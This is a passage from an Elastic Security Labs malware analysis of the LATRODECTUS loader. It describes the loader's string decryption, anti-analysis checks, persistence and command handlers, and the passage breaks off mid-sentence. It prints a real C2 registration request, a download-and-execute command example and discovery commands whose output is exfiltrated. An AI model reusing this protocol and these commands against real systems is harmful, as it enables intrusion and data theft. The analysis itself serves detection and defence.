<p><a href="https://github.com/elastic/labs-releases/blob/main/tools/latrodectus/latro_str_decrypt.py">String decryption and IDA commenting tool</a></p></div></div></div><div class="hidden lg:flex lg:col-span-1 text-sm lg:flex-col lg:space-y-6"><div class="toc"><h4 class="font-bold leading-tight text-lg md:text-2xl mb-3">Jump to section</h4><ul class="flex flex-col space-y-2"><li><a class="flex items-center space-x-1 hover:text-white" href="/security-labs/spring-cleaning-with-latrodectus#latrodectus-at-a-glance"><span>LATRODECTUS at a&nbsp;glance</span></a></li><li><a class="flex items-center space-x-1 hover:text-white ml-4" href="/security-labs/spring-cleaning-with-latrodectus#key-takeaways"><span>Key&nbsp;takeaways</span></a></li><li><a class="flex items-center space-x-1 hover:text-white ml-4" href="/security-labs/spring-cleaning-with-latrodectus#latrodectus-campaign-overview"><span>LATRODECTUS campaign&nbsp;overview</span></a></li><li><a class="flex items-center space-x-1 hover:text-white" href="/security-labs/spring-cleaning-with-latrodectus#latrodectus-analysis"><span>LATRODECTUS&nbsp;analysis</span></a></li><li><a class="flex items-center space-x-1 hover:text-white ml-4" href="/security-labs/spring-cleaning-with-latrodectus#string-obfuscation-"><span>String obfuscation&nbsp;</span></a></li><li><a class="flex items-center space-x-1 hover:text-white ml-4" href="/security-labs/spring-cleaning-with-latrodectus#runtime-api"><span>Runtime&nbsp;API</span></a></li><li><a class="flex items-center space-x-1 hover:text-white ml-4" href="/security-labs/spring-cleaning-with-latrodectus#anti-analysis"><span>Anti-&nbsp;analysis</span></a></li><li><a class="flex items-center space-x-1 hover:text-white ml-4" href="/security-labs/spring-cleaning-with-latrodectus#mutex"><span>Mutex</span></a></li><li><a class="flex items-center space-x-1 hover:text-white ml-4" href="/security-labs/spring-cleaning-with-latrodectus#hardware-id"><span>Hardware&nbsp;ID</span></a></li><li><a class="flex items-center space-x-1 hover:text-white ml-4" href="/security-labs/spring-cleaning-with-latrodectus#campaign-id"><span>Campaign&nbsp;ID</span></a></li></ul><button class="border-t border-white/20 w-full mt-3 py-2 flex items-center space-x-1 text-xs font-medium uppercase tracking-wide hover:text-white"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20" fill="currentColor" aria-hidden="true" class="w-3 h-3"><path d="M10.75 4.75a.75.75 0 00-1.5 0v4.5h-4.5a.75.75 0 000 1.5h4.5v4.5a.75.75 0 001.5 0v-4.5h4.5a.75.75 0 000-1.5h-4.5v-4.5z"></path></svg><span>Show more</span></button></div><div class="bg-zinc-900 border border-zinc-800 drop-shadow-lg p-5 md:p-2 sm:p-4 md:px-6 md:py-4 rounded-xl"><h4 class="font-bold leading-tight text-lg md:text-2xl mb-3">Elastic Security Labs Newsletter</h4><div><a target="_blank" class="button inline-flex" href="https://www.elastic.co/security-labs/newsletter?utm_source=security-labs">Sign Up</a></div></div></div></div><div class="bg-zinc-900 border border-zinc-800 drop-shadow-lg p-5 md:p-2 sm:p-4 md:px-6 md:py-4 rounded-xl my-5 md:my-10 max-w-3xl mx-auto flex flex-col items-center shadow-2xl"><h4 class="font-bold leading-tight text-lg md:text-2xl">Share this article</h4><div class="flex flex-wrap items-center justify-center mt-4 space-x-4"><a class="flex items-center space-x-2 button" href="https://twitter.com/intent/tweet?text=Spring Cleaning with LATRODECTUS: A Potential Replacement for ICEDID&amp;url=https://www.elastic.co/security-labs/spring-cleaning-with-latrodectus" target="_blank" rel="noopener noreferrer" aria-label="Share this article on Twitter" title="Share this article on Twitter"><svg class="w-4 h-4" viewBox="0 0 24 24"><path fill="currentColor" d="M23.954 4.569c-.885.389-1.83.653-2.825.772a4.98 4.98 0 002.187-2.746 9.955 9.955 0 01-3.157 1.204 4.98 4.98 0 00-8.49 4.54A14.128 14.128 0 011.69 3.05a4.98 4.98 0 001.54 6.638A4.94 4.94 0 011.2 8.62v.06a4.98 4.98 0 004 4.87 4.94 4.94 0 01-2.24.086 4.98 4.98 0 004.64 3.45A9.97 9.97 0 010 20.35a14.075 14.075 0 007.59 2.22c9.16 0 14.17-7.583 14.17-14.17 0-.217-.005-.434-.015-.65a10.128 10.128 0 002.485-2.58l-.001-.001z"></path></svg><span>Twitter</span></a><a class="flex items-center space-x-2 button" href="https://www.facebook.com/sharer/sharer.php?u=https://www.elastic.co/security-labs/spring-cleaning-with-latrodectus" target="_blank" rel="noopener noreferrer" aria-label="Share this article on Facebook" title="Share this article on Facebook"><svg class="w-4 h-4" viewBox="0 0 24 24"><path fill="currentColor" d="M22.5 12c0-5.799-4.701-10.5-10.5-10.5S1.5 6.201 1.5 12c0 5.301 3.901 9.699 9 10.401V14.4h-2.7v-2.7h2.7v-2.1c0-2.7 1.8-4.2 4.2-4.2 1.2 0 2.1.1 2.4.2v2.4h-1.5c-1.2 0-1.5.6-1.5 1.5v1.8h3l-.3 2.7h-2.7V22C18.599 21.3 22.5 17.301 22.5 12z"></path></svg><span>Facebook</span></a><a class="flex items-center space-x-2 button" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https://www.elastic.co/security-labs/spring-cleaning-with-latrodectus&amp;title=Spring Cleaning with LATRODECTUS: A Potential Replacement for ICEDID" target="_blank" rel="noopener noreferrer" aria-label="Share this article on LinkedIn" title="Share this article on LinkedIn"><svg class="w-4 h-4" viewBox="0 0 24 24"><path fill="currentColor" d="M19 0h-14c-2.761 0-5 2.239-5 5v14c0 2.761 2.239 5 5 5h14c2.762 0 5-2.239 5-5v-14c0-2.761-2.238-5-5-5zm-11 19h-3v-11h3v11zm-1.5-12.268c-.966 0-1.75-.79-1.75-1.764s.784-1.764 1.75-1.764 1.75.79 1.75 1.764-.783 1.764-1.75 1.764zm13.5 12.268h-3v-5.604c0-3.368-4-3.113-4 0v5.604h-3v-11h3v1.765c1.396-2.586 7-2.777 7 2.476v6.759z"></path></svg><span>LinkedIn</span></a><a class="flex items-center space-x-2 button" href="https://reddit.com/submit?url=https://www.elastic.co/security-labs/spring-cleaning-with-latrodectus&amp;title=Spring Cleaning with LATRODECTUS: A Potential Replacement for ICEDID" target="_blank" rel="noopener noreferrer" aria-label="Share this article on Reddit" title="Share this article on Reddit"><svg class="w-4 h-4" viewBox="0 0 24 24"><path fill-rule="evenodd" clip-rule="evenodd" d="M24 12C24 18.6274 18.6274 24 12 24C5.37258 24 0 18.6274 0 12C0 5.37258 5.37258 0 12 0C18.6274 0 24 5.37258 24 12ZM19.6879 11.0584C19.8819 11.3352 19.9916 11.6622 20.004 12C20.0091 12.3306 19.9205 12.656 19.7485 12.9384C19.5765 13.2208 19.3281 13.4488 19.032 13.596C19.0455 13.7717 19.0455 13.9483 19.032 14.124C19.032 16.812 15.9 18.996 12.036 18.996C8.172 18.996 5.04 16.812 5.04 14.124C5.02649 13.9483 5.02649 13.7717 5.04 13.596C4.80919 13.49 4.6042 13.335 4.43923 13.1419C4.27427 12.9487 4.15327 12.722 4.08462 12.4775C4.01598 12.2329 4.00133 11.9764 4.04169 11.7256C4.08205 11.4748 4.17646 11.2358 4.31837 11.0251C4.46028 10.8145 4.6463 10.6372 4.86354 10.5056C5.08078 10.3739 5.32404 10.2911 5.57646 10.2629C5.82889 10.2346 6.08444 10.2616 6.32541 10.3419C6.56638 10.4222 6.78701 10.5539 6.972 10.728C8.35473 9.79023 9.98146 9.27718 11.652 9.252L12.54 5.088C12.55 5.03979 12.5694 4.99405 12.5972 4.95341C12.625 4.91277 12.6605 4.87805 12.7018 4.85127C12.7431 4.82448 12.7894 4.80615 12.8378 4.79735C12.8862 4.78855 12.9359 4.78945 12.984 4.8L15.924 5.388C16.0676 5.14132 16.2944 4.9539 16.5637 4.85937C16.833 4.76484 17.1272 4.7694 17.3934 4.87222C17.6597 4.97505 17.8806 5.1694 18.0164 5.42041C18.1523 5.67141 18.1942 5.96262 18.1348 6.24177C18.0753 6.52092 17.9182 6.76972 17.6918 6.94352C17.4654 7.11732 17.1845 7.20473 16.8995 7.19006C16.6144 7.1754 16.3439 7.05962 16.1366 6.8635C15.9292 6.66738 15.7985 6.40378 15.768 6.12L13.2 5.58L12.42 9.324C14.0702 9.3594 15.6749 9.87206 17.04 10.8C17.2839 10.566 17.5902 10.4074 17.9221 10.3436C18.254 10.2797 18.5973 10.3132 18.9106 10.4401C19.2239 10.5669 19.4939 10.7817 19.6879 11.0584ZM8.20624 12.5333C8.07438 12.7307 8.004 12.9627 8.004 13.2C8.004 13.5183 8.13043 13.8235 8.35547 14.0485C8.58051 14.2736 8.88574 14.4 9.204 14.4C9.44134 14.4 9.67335 14.3296 9.87068 14.1978C10.068 14.0659 10.2218 13.8785 10.3127 13.6592C10.4035 13.4399 10.4272 13.1987 10.3809 12.9659C10.3346 12.7331 10.2204 12.5193 10.0525 12.3515C9.8847 12.1836 9.67089 12.0694 9.43811 12.0231C9.20533 11.9768 8.96405 12.0005 8.74478 12.0913C8.52551 12.1822 8.33809 12.336 8.20624 12.5333ZM12.012 17.424C13.0771 17.4681 14.1246 17.1416 14.976 16.5V16.548C15.0075 16.5173 15.0327 16.4806 15.05 16.4402C15.0674 16.3997 15.0766 16.3563 15.0772 16.3122C15.0777 16.2682 15.0696 16.2245 15.0533 16.1837C15.0369 16.1428 15.0127 16.1055 14.982 16.074C14.9513 16.0425 14.9146 16.0173 14.8742 16C14.8337 15.9826 14.7903 15.9734 14.7462 15.9728C14.7022 15.9723 14.6585 15.9804 14.6177 15.9967C14.5768 16.0131 14.5395 16.0373 14.508 16.068C13.7797 16.5904 12.895 16.8487 12 16.8C11.1061 16.8399 10.2255 16.5732 9.504 16.044C9.44182 15.993 9.36289 15.9669 9.28256 15.9708C9.20222 15.9748 9.12622 16.0085 9.06935 16.0653C9.01247 16.1222 8.97879 16.1982 8.97484 16.2786C8.97089 16.3589 8.99697 16.4378 9.048 16.5C9.89937 17.1416 10.9469 17.4681 12.012 17.424ZM14.0933 14.2458C14.2907 14.3776 14.5227 14.448 14.76 14.448L14.748 14.496C14.9107 14.4978 15.0721 14.4664 15.2223 14.4038C15.3725 14.3413 15.5084 14.2488 15.6218 14.1321C15.7352 14.0154 15.8236 13.8768 15.8818 13.7248C15.9399 13.5728 15.9665 13.4106 15.96 13.248C15.96 13.0107 15.8896 12.7787 15.7578 12.5813C15.6259 12.384 15.4385 12.2302 15.2192 12.1393C14.9999 12.0485 14.7587 12.0248 14.5259 12.0711C14.2931 12.1174 14.0793 12.2316 13.9115 12.3995C13.7436 12.5673 13.6294 12.7811 13.5831 13.0139C13.5368 13.2467 13.5605 13.4879 13.6513 13.7072C13.7422 13.9265 13.896 14.1139 14.0933 14.2458Z" fill="currentColor"></path></svg><span>Reddit</span></a></div></div></article></main><footer class="mt-auto text-xs md:text-sm"><div class="container py-6 flex flex-col md:flex-row gap-2 md:gap-0 justify-between items-center"><div class="text-zinc-300"><nav><ul class="flex space-x-4"><li><a class="hover:text-white font-medium" href="/security-labs/sitemap.xml">Sitemap</a></li><li><a class="hover:text-white font-medium flex items-center space-x-1" href="https://elastic.co?utm_source=elastic-search-labs&amp;utm_medium=referral&amp;utm_campaign=search-labs&amp;utm_content=footer"><svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" aria-hidden="true" class="inline-block w-3 h-3"><path stroke-linecap="round" stroke-linejoin="round" d="M13.5 6H5.25A2.25 2.25 0 003 8.25v10.5A2.25 2.25 0 005.25 21h10.5A2.25 2.25 0 0018 18.75V10.5m-10.5 6L21 3m0 0h-5.25M21 3v5.25"></path></svg><span>Elastic.co</span></a></li><li><a class="hover:text-white font-medium flex items-center space-x-1" href="https://twitter.com/elasticseclabs"><svg class="w-4 h-4 inline-block w-3 h-3" viewBox="0 0 24 24"><path fill="currentColor" d="M23.954 4.569c-.885.389-1.83.653-2.825.772a4.98 4.98 0 002.187-2.746 9.955 9.955 0 01-3.157 1.204 4.98 4.98 0 00-8.49 4.54A14.128 14.128 0 011.69 3.05a4.98 4.98 0 001.54 6.638A4.94 4.94 0 011.2 8.62v.06a4.98 4.98 0 004 4.87 4.94 4.94 0 01-2.24.086 4.98 4.98 0 004.64 3.45A9.97 9.97 0 010 20.35a14.075 14.075 0 007.59 2.22c9.16 0 14.17-7.583 14.17-14.17 0-.217-.005-.434-.015-.65a10.128 10.128 0 002.485-2.58l-.001-.001z"></path></svg><span>@elasticseclabs</span></a></li></ul></nav></div><div class="flex flex-col space-y-1 text-zinc-300"><p>© <!-- -->2024<!-- -->. Elasticsearch B.V. All Rights Reserved.</p></div></div></footer></main></div><script id="__NEXT_DATA__" type="application/json">{"props":{"pageProps":{"article":{"title":"Spring Cleaning with LATRODECTUS: A Potential Replacement for ICEDID","slug":"spring-cleaning-with-latrodectus","date":"2024-05-16","description":"Elastic Security Labs has observed an uptick in a recent emerging loader known as LATRODECTUS. This lightweight loader packs a big punch with ties to ICEDID and may turn into a possible replacement to fill the gap in the loader market.","image":"Security Labs Images 16.jpg","subtitle":"The LATRODECTUS loader evolves to deliver ICEDID and other malware","tags":["icedid","latrodectus","loader"],"body":{"raw":"\n## LATRODECTUS at a glance\n\nFirst [discovered](https://medium.com/walmartglobaltech/icedid-gets-loaded-af073b7b6d39) by Walmart researchers in October of 2023, [LATRODECTUS](https://malpedia.caad.fkie.fraunhofer.de/details/win.unidentified_111) is a malware loader gaining popularity among cybercriminals. While this is considered a new family, there is a strong link between LATRODECTUS and [ICEDID](https://www.elastic.co/security-labs/thawing-the-permafrost-of-icedid-summary) due to behavioral and developmental similarities, including a command handler that downloads and executes encrypted payloads like ICEDID. Proofpoint and Team Cymru built upon this connection to discover a [strong link](https://www.proofpoint.com/us/blog/threat-insight/latrodectus-spider-bytes-ice) between the network infrastructure used by both the operators of ICEDID and LATRODECTUS.\n\nLATRODECTUS offers a comprehensive range of standard capabilities that threat actors can utilize to deploy further payloads, conducting various activities after initial compromise. The code base isn’t obfuscated and contains only 11 command handlers focused on enumeration and execution. This type of loader represents a recent wave observed by our team such as [PIKABOT](https://www.elastic.co/security-labs/pikabot-i-choose-you), where the code is more lightweight and direct with a limited number of handlers. \n\nThis article will focus on LATRODECTUS itself, analyzing its most significant features and sharing resources for addressing this financially impactful threat.\n\n### Key takeaways\n\n - Initially discovered by Walmart researchers last year, LATRODECTUS continues to gain adoption among recent financially-motivated campaigns\n - LATRODECTUS, a possible replacement for ICEDID shares similarity to ICEDID including a command handler to execute ICEDID payloads\n - We observed new event handlers (process discovery, desktop file listing) since its inception and integration of a self-delete technique to delete running files\n - Elastic Security provides a high degree of capability through memory signatures, behavioral rules, and hunting opportunities to respond to threats like LATRODECTUS\n\n### LATRODECTUS campaign overview\n\nBeginning early March of 2024, Elastic Security Labs observed an increase in email campaigns delivering LATRODECTUS. These campaigns typically involve a recognizable infection chain involving oversized JavaScript files that utilize WMI’s ability to invoke msiexec.exe and install a remotely-hosted MSI file, remotely hosted on a WEBDAV share.\n\n![](/assets/images/spring-cleaning-with-latrodectus/image44.png)\n\nWith major changes in the loader space during the past year, such as the [QBOT](https://www.elastic.co/security-labs/qbot-malware-analysis) takedown and [ICEDID](https://www.elastic.co/security-labs/unpacking-icedid) dropping off, we are seeing new loaders such as [PIKABOT](https://www.elastic.co/security-labs/pikabot-i-choose-you) and [LATRODECTUS](https://malpedia.caad.fkie.fraunhofer.de/details/win.unidentified_111) have emerged as possible replacements.\n\n## LATRODECTUS analysis\n\nOur LATRODECTUS [sample](https://www.virustotal.com/gui/file/aee22a35cbdac3f16c3ed742c0b1bfe9739a13469cf43b36fb2c63565111028c/details) comes initially packed with file information [masquerading](https://attack.mitre.org/techniques/T1036/) as a component to Bitdefender’s kernel-mode driver (TRUFOS.SYS), shown in the following image.\n\n![File version information of packed LATRODECTUS sample](/assets/images/spring-cleaning-with-latrodectus/image47.png)\n\n\nIn order to move forward with malware analysis, the sample must be unpacked manually or via an automatic unpacking service such as [UnpacMe](http://Unpac.Me).\n\n![UnpacMe summary](/assets/images/spring-cleaning-with-latrodectus/image26.png)\n\n\nLATRODECTUS is a DLL with 4 different exports, and each export is assigned the same export address.\n\n![Exports for LATRODECTUS](/assets/images/spring-cleaning-with-latrodectus/image21.png)\n\n\n### String obfuscation \n\nAll of the strings within LATRODECTUS are protected using a straightforward algorithm on the encrypted bytes and applying a transformation by performing arithmetic and bitwise operations. The initial [report](https://medium.com/walmartglobaltech/icedid-gets-loaded-af073b7b6d39) published in 2023 detailed a PRNG algorithm that was not observed in our sample, suggesting continuous development of this loader. Below is the algorithm implemented in Python using our [nightMARE framework](https://github.com/elastic/labs-releases/tree/main/nightMARE):\n\n``` python\ndef decrypt_string(encrypted_bytes: bytes) -\u003e bytes:\n    x = cast.u32(encrypted_bytes[:4])\n    y = cast.u16(encrypted_bytes[4:6])\n    byte_size = cast.u16(cast.p32(x ^ y)[:2])\n    decoded_bytes = bytearray(byte_size)\n\n    for i, b in enumerate(encrypted_bytes[6 : 6 + byte_size]):\n        decoded_bytes[i] = ((x + i + 1) ^ b) % 256\n\n    return bytes(decoded_bytes)\n```\n\n### Runtime API\n\nLATRODECTUS obfuscates the majority of its imports until runtime. At the start of the program, it queries the PEB in combination with using a CRC32 checksum to resolve ```kernel32.dll``` and ```ntdll.dll``` modules and their functions. In order to resolve additional libraries such as ```user32.dll``` or ```wininet.dll```, the malware takes a different approach performing a wildcard search (```*.dll```) in the Windows system directory. It retrieves each DLL filename and passes them directly to a CRC32 checksum function. \n\n![DLL search using a CRC32 checksum](/assets/images/spring-cleaning-with-latrodectus/image15.png)\n\n\n### Anti-analysis\nWhen all the imports are resolved, LATRODECTUS performs several serial anti-analysis checks. The first monitors for a debugger by looking for the BeingDebugged flag inside the Process Environment Block (PEB). If a debugger is identified, the program terminates.\n\n![```BeingDebugged``` check via PEB](/assets/images/spring-cleaning-with-latrodectus/image35.png)\n\n\nIn order to avoid sandboxes or virtual machines that may have a low number of active processes, two validation checks are used to combine the number of running processes with the OS product version. \n\n![Number of processes and OS validation checks](/assets/images/spring-cleaning-with-latrodectus/image30.png)\n\n\nIn order to account for the major differences between Windows OS versions, the developer uses a custom enum based on the major/minor version, and build numbers within Windows.\n\n![Enum related to build numbers, OS version](/assets/images/spring-cleaning-with-latrodectus/image4.png)\n\n\nThe two previous conditions translate to:\n\n - LATRODECTUS will exit if the number of processes is less than 75 and the OS version is a recent build such as Windows 10, Windows Server 2016, or Windows 11\n - LATRODECTUS will exit if the number of processes is less than 50 and the OS version is an older build such as Windows Server 2003 R2, Windows XP, Windows 2000, Windows 7, Windows 8, or Windows Server 2012/R2\n\nAfter the sandbox check, LATRODECTUS verifies if the current process is running under WOW64, a subsystem of Windows operating systems that allows for 32-bit applications to run on 64-bit systems. If true (running as a 32-bit application on a 64-bit OS), the malware will exit.\n\n![```IsWow64Process``` check](/assets/images/spring-cleaning-with-latrodectus/image27.png)\n\n\nThe last check is based on verifying the MAC address via the ```GetAdaptersInfo()``` call from ```iphlpapi.dll```. If there is no valid MAC Address, the malware will also terminate.\n\n![MAC Address check](/assets/images/spring-cleaning-with-latrodectus/image36.png)\n\n\n### Mutex\n\nThis malware uses the string ```runnung``` as the mutex to prevent re-infection on the host, which may be an accidental typo on the part of developers.\n\n![Mutex](/assets/images/spring-cleaning-with-latrodectus/image29.png)\n\n\n### Hardware ID\n\nAfter the mutex creation, LATRODECTUS will generate a hardware ID that is seeded from the volume serial number of the machine in combination with multiplying a hard-coded constant (```0x19660D```).\n\n![HWID calculation](/assets/images/spring-cleaning-with-latrodectus/image6.png)\n\n\n### Campaign ID\n\nAt this stage, the decrypted campaign name (```Littlehw```) from our sample is used as a seed passed into a Fowler–Noll–Vo hashing [function](https://en.wikipedia.org/wiki/Fowler%E2%80%93Noll%E2%80%93Vo_hash_function). This will produce a hash that is used by the actor to track different campaigns and associated victim machines.\n\n![Campaign ID calculation using FNV](/assets/images/spring-cleaning-with-latrodectus/image37.png)\n\n\n### Setup / persistence\n\nThe malware will generate a folder path using a configuration parameter, these determine the location where LATRODECTUS will be dropped on disk, such as the following directories:\n - ```AppData```\n - ```Desktop```\n - ```Startup```\n - ```Personal```\n - ```Local\\AppData```\n\nOur sample was configured with the ```AppData``` location using a hard-coded directory string ```Custom_update``` along with a hardcoded filename ```Update_``` concatenated with digits seeded from the volume serial number. Below is the full file path inside our VM:\n\n```\nC:\\Users\\REM\\AppData\\Roaming\\Custom_update\\Update_88d58563.dll\n```\n\nThe malware will check for an existing file ```AppData\\Roaming\\Custom_update\\update_data.dat``` to read from, and if the file does not exist it will create the directory before writing a copy of itself in the directory.\n\n![LATRODECTUS written in ```AppData```](/assets/images/spring-cleaning-with-latrodectus/image7.png)\n\n\nAfter the file is copied, LATRODECTUS retrieves two C2 domains from the global configuration, using the previously-described string decryption function.\n\n![Decrypting C2 servers](/assets/images/spring-cleaning-with-latrodectus/image19.png)\n\n\nBefore the main thread is executed for command dispatching, LATRODECTUS sets up a scheduled task for persistence using the Windows Component Object Model (COM). \n\n![Scheduled task creation via COM](/assets/images/spring-cleaning-with-latrodectus/image14.png)\n\n\nIn our sample, the task name is hardcoded as ```Updater``` and scheduled to execute upon successful logon.\n\n![Scheduled task properties](/assets/images/spring-cleaning-with-latrodectus/image12.png)\n\n\n### Self-deletion\n\nSelf-deletion is one noteworthy technique incorporated by LATRODECTUS. It was [discovered](https://x.com/jonasLyk/status/1350401461985955840) by Jonas Lykkegaard and implemented by Lloyd Davies in the delete-self-poc [repo](https://github.com/LloydLabs/delete-self-poc). The technique allows LATRODECTUS to delete itself while the process is still running using an alternate data stream. \n\nElastic Security Labs has seen this technique adopted in malware such as the [ROOK](https://chuongdong.com/reverse%20engineering/2022/01/06/RookRansomware/#anti-detection-alternate-data-streams) ransomware family. The likely objective is to hinder incident response processes by interfering with collection and analysis. The compiled malware contains a [string](https://github.com/LloydLabs/delete-self-poc/blob/49fe92218fdcfe8e173aa60a9eb307bae07cb027/main.h#L10) (```:wtfbbq```) present in the repository.\n\n![Self-deletion code in LATRODECTUS](/assets/images/spring-cleaning-with-latrodectus/image2.png)\n\n\nThis technique is observed at the start of the infection as well as when the malware performs an update using event handler #15. Elastic Security Labs has created a [CAPA rule](https://github.com/mandiant/capa-rules/blob/master/anti-analysis/anti-forensic/self-deletion/self-delete-using-alternate-data-streams.yml) to help other organizations identify this behavior generically when analyzing various malware.\n\n### Communication\n\nLATRODECTUS encrypts its requests using base64 and RC4 with a hardcoded password of ```12345```. The first POST request over HTTPS that includes victim information along with configuration details, registering the infected system.\n\n```\nPOST https://aytobusesre.com/live/ HTTP/1.1\nAccept: */*\nContent-Type: application/x-www-form-urlencoded\nUser-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Tob 1.1)\nHost: aytobusesre.com\nContent-Length: 256\nCache-Control: no-cache\n\nM1pNDFh7flKrBaDJqAPvJ98BTFDZdSDWDD8o3bMJbpmu0qdYv0FCZ0u6GtKSN0g//WHAS2npR/HDoLtIKBgkLwyrIh/3EJ+UR/0EKhYUzgm9K4DotfExUiX9FBy/HeV7C4PgPDigm55zCU7O9kSADMtviAodjuRBVW3DJ2Pf5+pGH9SG1VI8bdmZg+6GQFpcFTGjdWVcrORkxBjCGq3Eiv2svt3+ZFIN126PcvN95YJ0ie1Puljfs3wqsW455V7O\n```\n![Initial registration request](/assets/images/spring-cleaning-with-latrodectus/image32.png)\n\n\nBelow is an example of the decrypted contents sent in the first request:\n\n```\ncounter=0\u0026type=1\u0026guid=249507485CA29F24F77B0F43D7BA\u0026os=6\u0026arch=1\u0026username=user\u0026group=510584660\u0026ver=1.1\u0026up=4\u0026direction=aytobusesre.com\u0026mac=00:0c:24:0e:29:85;\u0026computername=DESKTOP-3C4ILHO\u0026domain=-\n```\n\n| Name | Description |\n| ---- | ----------- |\n| counter | Number of C2 requests increments by one for each callback |\n| type | Type of request (registration, etc) |\n| guid | Generated hardware ID seeded by volume serial number |\n| os | Windows OS product version |\n| arch | Windows architecture version |\n| username | Username of infected machine |\n| group | Campaign identifier seeded by unique string in binary with FNV |\n| version | LATRODECTUS version |\n| up | Unknown |\n| direction | C2 domain\n| mac | MAC Address |\n| computername | Hostname of infected machine |\n| domain | Domain belonging to infected machine |\n\nEach request is pipe-delimited by an object type, integer value, and corresponding argument. There are 4 object types which route the attacker controlled commands (**CLEARURL**, **URLS**, **COMMAND**, **ERROR**).  \n\n![Command dispatching logic](/assets/images/spring-cleaning-with-latrodectus/image39.png)\n\n\nThe main event handlers are passed through the **COMMAND** object type with the handler ID and their respective argument.\n\n```\nCOMMAND|12|http://www.meow123.com/test \n```\n\nThe **CLEARURL** object type is used to delete any configured domains. The **URLS** object type allows the attacker to swap to a new C2 URL. The last object type, **ERROR**, is not currently configured.\n\n![Example of command request via CyberChef](/assets/images/spring-cleaning-with-latrodectus/image11.png)\n\n\n### Bot Functionality\n\nLATRODECTUS’s core functionality is driven through its command handlers. These handlers are used to collect information from the victim machine, provide execution capabilities as well as configure the implant. We have seen two additional handlers (retrieve processes, desktop listing) added since the initial [publication](https://medium.com/walmartglobaltech/icedid-gets-loaded-af073b7b6d39) which may be a sign that the codebase is still active and changing. \n\n\n| Command ID | Description |\n| ---------- | ----------- |\n| 2 | Retrieve file listing from desktop directory |\n| 3 | Retrieve process ancestry |\n| 4 | Collect system information |\n| 12 | Download and execute PE |\n| 13 | Download and execute DLL |\n| 14 | Download and execute shellcode |\n| 15 | Perform update, restart |\n| 17 | Terminate own process and threads |\n| 18 | Download and execute ICEDID payload |\n| 19 | Increase Beacon Timeout |\n| 20 | Resets request counter |\n\n#### Desktop listing - command ID (2)\n\nThis command handler will retrieve a list of the contents of the user’s desktop, which the developer refers to as ```desklinks```. This data will be encrypted and appended to the outbound beacon request. This is used for enumerating and validating victim environments quickly.\n\n![Desktop listing (Handler #2)](/assets/images/spring-cleaning-with-latrodectus/image16.png)\n\n\n**Example request**:\n\n```\ncounter=0\u0026type=1\u0026guid=249507485CA29F24F77B0F43D7BA\u0026os=6\u0026arch=1\u0026username=user\u0026group=510584660\u0026ver=1.1\u0026up=4\u0026direction=aytobusesre.com\u0026desklinks=[\"OneDrive.lnk\",\"OneNote.lnk\",\"PowerPoint.lnk\",\"Notepad++.lnk\",\"Excel.lnk\",\"Google Chrome.lnk\",\"Snipping Tool.lnk\",\"Notepad.lnk\",\"Paint.lnk\"]\n```\n\n#### Process ancestry - command ID (3)\n\nThis event handler is referenced as **proclist** by the developer where it collects the entire running process ancestry from the infected machine via the **CreateToolhelp32Snapshot** API. \n\n![Retrieve process ancestry (Handler #3)](/assets/images/spring-cleaning-with-latrodectus/image25.png)\n\n\nLike security researchers, malware authors are interested in process parent/child relationships for decision-making. The authors of LATRODECTUS even collect information about process grandchildren, likely to validate different compromised environments.\n\n![Example of process ancestry collected by LATRODECTUS](/assets/images/spring-cleaning-with-latrodectus/image17.png)\n\n\n#### Collect system information - command ID (4)\n\nThis command handler creates a new thread that runs the following system discovery/enumeration commands, each of which is a potential detection opportunity:\n\n``` bash\nC:\\Windows\\System32\\cmd.exe /c ipconfig /all\nC:\\Windows\\System32\\cmd.exe /c systeminfo\nC:\\Windows\\System32\\cmd.exe /c nltest /domain_trusts\nC:\\Windows\\System32\\cmd.exe /c nltest /domain_trusts /all_trusts\nC:\\Windows\\System32\\cmd.exe /c net view /all /domain\nC:\\Windows\\System32\\cmd.exe /c net view /all\nC:\\Windows\\System32\\cmd.exe /c net group \"Domain Admins\" /domain\nC:\\Windows\\System32\\wbem\\wmic.exe /Node:localhost /Namespace:\\\\root\\SecurityCenter2 Path AntiVirusProduct Get * /Format:List\nC:\\Windows\\System32\\cmd.exe /c net config workstation\nC:\\Windows\\System32\\cmd.exe /c wmic.exe /node:localhost /namespace:\\\\root\\SecurityCenter2 path AntiVirusProduct Get DisplayName | findstr /V /B /C:displayName || echo No Antivirus installed\nC:\\Windows\\System32\\cmd.exe /c whoami /groups\n```\n\nEach output is placed into URI with corresponding collected data:\n\n```\n\u0026ipconfig=\n\u0026systeminfo=\n\u0026domain_trusts=\n\u0026domain_trusts_all=\n\u0026net_view_all_domain=\n\u0026net_view_all=\n\u0026net_group=\n\u0026wmic=\n\u0026net_config_ws=\n\u0026net_wmic_av=\n\u0026whoami_group=\n```\n\n#### Download and execute PE - command ID (12)\n\nThis handler downloads a PE file from the C2 server then writes the content to disk with a randomly generated file name, then executes the file.\n\n![Download and Run PE function (Handler #4)](/assets/images/spring-cleaning-with-latrodectus/image19.png)\n\n\nBelow is an example in our environment using this handler:\n\n![Process tree of download and run PE function](/assets/images/spring-cleaning-with-latrodectus/image34.png)\n\n\n#### Download and execute DLL - command ID (13)\n\nThis command handler downloads a DLL from C2 server, writes it to disk with a randomly generated file name, and executes the DLL using rundll32.exe.\n\n![Download and run DLL function (Handler #13)](/assets/images/spring-cleaning-with-latrodectus/image10.png)\n\n\n#### Download and execute shellcode - command (14)\n\nThis command handler downloads shellcode from the C2 server via ```InternetReadFile```, allocates and copies the shellcode into memory then directly calls it with a new thread pointing at the shellcode.\n\n![Shellcode execution (Handler #14)](/assets/images/spring-cleaning-with-latrodectus/image24.png)\n\n\n#### Update / restart  - command ID (15)\n\nThis handler appears to perform a binary update to the malware where it’s downloaded, the existing thread/mutex is notified, and then released. The file is subsequently deleted and a new binary is downloaded/executed before terminating the existing process.\n\n![Update handler (Handler #15)](/assets/images/spring-cleaning-with-latrodectus/image33.png)\n\n\n#### Terminate - command ID (17)\nThis handler will terminate the existing LATRODECTUS process.\n\n![Self-termination (Handler #17)](/assets/images/spring-cleaning-with-latrodectus/image46.png)\n\n\n#### Download and execute hosted ICEID payload - command ID (18)\n\nThis command handler downloads two ICEDID components from a LATRODECTUS server and executes them using a spawned ```rundll32.exe``` process. We haven’t personally observed this being used in-the-wild, however.\n\nThe handler creates a folder containing two files to the ```AppData\\Roaming\\``` 